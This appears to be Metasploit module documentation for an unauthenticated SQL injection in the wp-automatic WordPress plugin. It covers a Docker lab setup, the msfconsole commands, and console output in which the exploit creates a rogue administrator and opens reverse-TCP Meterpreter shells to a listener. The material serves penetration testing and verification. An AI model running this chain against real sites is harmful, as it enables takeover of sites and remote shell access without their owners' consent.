## Vulnerable Application

The vulnerability affects the **wp-automatic** plugin, version **3.92.0** and
below, allowing unauthenticated SQL injection that can be leveraged to create a
malicious administrator and gain full control of the WordPress instance.

### Pre-requisites:
- **Docker** and **Docker Compose** installed on your system.

### Setup Instructions:

1. **Download the Docker Compose file**:
   - Below is the content of the **docker-compose.yml** file to set up WordPress
     with the vulnerable wp-automatic plugin and a MySQL database.

```yaml
version: '3.1'

services:
  wordpress:
    image: wordpress:latest
    restart: always
    ports:
      - 5555:80
    environment:
      WORDPRESS_DB_HOST: db
      WORDPRESS_DB_USER: chocapikk
      WORDPRESS_DB_PASSWORD: dummy_password
      WORDPRESS_DB_NAME: exploit_market
    mem_limit: 512m
    volumes:
      - wordpress:/var/www/html
      - ./custom.ini:/usr/local/etc/php/conf.d/custom.ini

  db:
    image: mysql:5.7
    restart: always
    environment:
      MYSQL_DATABASE: exploit_market
      MYSQL_USER: chocapikk
      MYSQL_PASSWORD: dummy_password
      MYSQL_RANDOM_ROOT_PASSWORD: '1'
    volumes:
      - db:/var/lib/mysql

volumes:
  wordpress:
  db:
```

2. **Add custom PHP configuration** (for plugin uploads):
   - Create a file named `custom.ini` in the same directory as `docker-compose.yml` with the following content:

```bash
upload_max_filesize = 64M
post_max_size = 64M
```

This increases the file size limits for uploading large plugins.

3. **Start the Docker environment**:
   - In the directory where you saved the `docker-compose.yml` file, run the following command to start the services:

```bash
docker-compose up -d
```

4. **Install wp-automatic Plugin**:
   - Download the vulnerable version of wp-automatic:

```bash
wget https://github.com/ThatNotEasy/CVE-2024-27956/raw/refs/heads/main/wp-automatic.zip
```

   - Install the plugin in your running WordPress instance:
     - Extract the plugin files and copy them to your WordPress container:

```bash
unzip wp-automatic.zip
docker cp wp-automatic wordpress:/var/www/html/wp-content/plugins/
```

   - Navigate to `http://localhost:5555/wp-admin` in your browser and activate the **wp-automatic** plugin in the WordPress admin panel.

## Verification Steps

1. **Set up WordPress** with the vulnerable **wp-automatic** plugin.
2. **Start Metasploit** using the command `msfconsole`.
3. Use the correct module for the vulnerability:

```bash
use exploit/multi/http/wp_automatic_sqli_to_rce
```

4. Set the target's IP and URI:

```bash
set RHOSTS <target_ip>
set TARGETURI /
```

5. **Run the module**:

```bash
run
```

6. **Verify the SQL Injection**:
   - After running the module, the SQL injection payload will attempt to create a new administrator in the WordPress database.

## Options

### USERNAME
The username to create for the malicious administrator. If not set, a random username will be generated using Faker.

### PASSWORD
The password for the malicious administrator. If not set, a random password will be generated using Faker.

### EMAIL
The email address for the malicious administrator. If not set, a random email will be generated using Faker.

## Scenarios

The following scenario demonstrates an SQL injection attack against a WordPress
installation running **wp-automatic <= 3.92.0** on a Docker environment with MySQL.

### Step-by-step Scenario

1. **PHP Meterpreter (ARCH_PHP) (php/meterpreter/reverse_tcp)**:

```bash
msf6 exploit(multi/http/wp_automatic_sqli_to_rce) > options 

Module options (exploit/multi/http/wp_automatic_sqli_to_rce):

   Name       Current Setting          Required  Description
   ----       ---------------          --------  -----------
   EMAIL      hyman_wunsch@koepp.test  no        Email for the new user
   PASSWORD   wO4VlSc0uuee4C1H         no        Password for the new user
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                              yes       The target host(s), see https://docs.metasploit.com/docs/using-metaspl
                                                 oit/basics/using-metasploit.html
   RPORT      80                       yes       The target port (TCP)
   SSL        false                    no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                        yes       The base path to the wordpress application
   USERNAME   roland                   no        Username to create
   VHOST                               no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.36     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   PHP In-Memory



View the full module info with the info, or info -d command.

msf6 exploit(multi/http/wp_automatic_sqli_to_rce) > run http://127.0.0.1:5555

[*] Started reverse TCP handler on 192.168.1.36:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting SQLi test to verify vulnerability...
[+] Target is vulnerable to SQLi!
[+] The target appears to be vulnerable.
[*] Starting the process to identify the table prefix...
[*] Executing SQLi to retrieve the table prefix for users table containing 'user_login' and 'user_pass' columns...
[+] Successfully detected table prefix: wp_
[+] roland is now an administrator!
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/Stim/sensor.php...
[*] Sending stage (39927 bytes) to 172.18.0.3
[+] Deleted sensor.php
[+] Deleted Stim.php
[+] Deleted ../Stim
[*] Meterpreter session 1 opened (192.168.1.36:4444 -> 172.18.0.3:45388) at 2024-09-22 14:05:33 +0200

meterpreter > sysinfo 
Computer    : bfc25b6dcc8b
OS          : Linux bfc25b6dcc8b 5.15.0-121-generic #131-Ubuntu SMP Fri Aug 9 08:29:53 UTC 2024 x86_64
Meterpreter : php/linux
meterpreter > 
```

2. **Linux Command Shell (ARCH_CMD) (cmd/linux/http/x64/meterpreter/reverse_tcp)**:

```bash
msf6 exploit(multi/http/wp_automatic_sqli_to_rce) > run http://127.0.0.1:5555

[*] Started reverse TCP handler on 192.168.1.36:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Attempting SQLi test to verify vulnerability...
[+] Target is vulnerable to SQLi!
[+] The target appears to be vulnerable.
[*] Starting the process to identify the table prefix...
[*] Executing SQLi to retrieve the table prefix for users table containing 'user_login' and 'user_pass' columns...
[+] Successfully detected table prefix: wp_
[+] roland is now an administrator!
[*] Uploading payload...
[*] Executing the payload at /wp-content/plugins/fixflex/driver.php...
[*] Sending stage (3045380 bytes) to 172.18.0.3
[+] Deleted driver.php
[+] Deleted fixflex.php
[+] Deleted ../fixflex
[*] Meterpreter session 8 opened (192.168.1.36:4444 -> 172.18.0.3:47934) at 2024-09-22 15:52:42 +0200

meterpreter > sysinfo 
Computer     : 172.18.0.3
OS           : Debian 12.5 (Linux 5.15.0-121-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > 
```
